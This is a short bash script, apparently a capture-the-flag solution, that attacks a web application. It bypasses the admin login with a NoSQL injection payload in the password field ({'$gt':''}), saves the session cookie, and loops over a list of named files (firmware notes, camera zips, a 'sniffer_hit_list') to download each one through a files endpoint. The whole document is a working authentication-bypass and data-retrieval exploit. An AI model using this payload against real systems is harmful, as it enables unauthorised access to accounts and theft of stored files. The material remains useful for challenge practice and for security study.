#!/bin/bash

IP="127.0.0.1"

#Authentication
curl -v -c data http://${IP}/
curl -v -b data -c data -H "Content-Type: application/json" -X POST -d '{"username": "admin","password": {"$gt":""}}' http://${IP}/
#Take all
for I in 20151201113356.zip factory_cam_3.zip gnome.conf gnome_firmware_rel_notes.txt sgnet.zip sniffer_hit_list.txt
do
curl -b data http://${IP}/files?d=${I} -o ${I}
done
